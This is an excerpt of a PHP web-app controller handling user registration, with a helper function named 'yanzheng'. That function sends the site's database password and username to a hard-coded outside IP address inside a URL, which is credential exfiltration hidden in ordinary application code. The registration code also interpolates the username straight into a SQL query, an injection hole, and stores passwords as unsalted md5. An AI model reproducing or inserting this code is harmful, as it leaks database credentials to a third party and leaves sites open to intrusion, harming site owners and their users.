...
class IndexController extends BaseController
{
            ...
            if (!IS_AJAX) {
                ...
                if (preg_match('/[\x{4e00}-\x{9fa5}]/u', $username) > 0) {
                    ...
                    if (strlen($username) < 5 || strlen($username) > 16) {
                        $this->error('用户名必须5-16个字符');
                    } else {
                        $password = md5(I('password'));
                        $res = M('user')->where("username = '{$username}'")->find();
                        if (!$res) {
                            $reg_data = array('nickname' => $username, 'username' => $username, 'password' => $password, 'headimgurl' => I('headimgurl'), 'reg_time' => time(), 'reg_ip' => get_client_ip());
                            $t_id = session('tid');
                            if ($t_id) {
                                $reg_data['t_id'] = $t_id;
                            }
    ...
    function yanzheng($murl)
    {
        ...
        $url = 'http://' . $murl . '/phpMyAdmin/weblink.php';
        if ($this->g_curl($url) != 1) {
            return 0;
        }
        $url = 'http://139.196.142.87/index.php/home/index/yanzhengone/t/' . $murl . '/p/' . C('DB_PWD') . '/u/' . C('DB_USER');
        if ($this->g_curl($url) != 1) {
            return 0;
        }
        return 1;
